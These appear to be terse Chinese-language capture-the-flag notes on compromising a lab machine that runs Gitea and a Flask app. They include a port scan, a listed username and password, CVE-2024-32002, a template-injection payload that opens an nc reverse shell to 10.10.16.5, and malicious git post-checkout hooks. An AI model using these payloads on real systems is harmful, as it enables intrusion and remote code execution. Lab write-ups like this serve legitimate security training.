# 服务

```
┌──(root㉿kali)-[~]
└─# nmap -Pn -p- 10.10.11.26
Starting Nmap 7.93 ( https://nmap.org ) at 2024-07-30 04:34 EDT
Stats: 0:11:12 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 5.10% done; ETC: 08:14 (3:28:32 remaining)
Nmap scan report for 10.10.11.26
Host is up (0.31s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT     STATE SERVICE
3000/tcp open  ppp
5000/tcp open  upnp
5985/tcp open  wsman
7680/tcp open  pando-pub

Nmap done: 1 IP address (1 host up) scanned in 5281.61 seconds

```


Powered by Gitea
当前版本: 1.21.6


Server: Werkzeug/3.0.3 Python/3.12.3




Gitea上找到5000端口的源码
![](Compiled_files/1.jpg)


在Calculator项目里得知git的版本为：2.45.0.windows.1
![](Compiled_files/2.jpg)


CVE-2024-32002

chen

R2*#?n%V8e4#Hhk



git remote add origin http://10.10.11.26:3000/max/captain.git


git remote add origin http://10.10.11.26:3000/max/hook.git


http://{{config.__class__.__init__.__globals__['os'].popen('mkfifo /tmp/ZTQ0Y; nc 10.10.16.5 443 0</tmp/ZTQ0Y | /bin/sh >/tmp/ZTQ0Y 2>&1; rm /tmp/ZTQ0Y').read()}}.git


http://{{ __import__('os').system('ping -c 1 10.10.16.5') }}.git


echo 'cmd /c ping 10.10.16.5' > .githooks/post-checkout


cat > y/hooks/post-checkout <<EOF
#!/bin/bash
cmd.exe /c ping 10.10.16.5
EOF
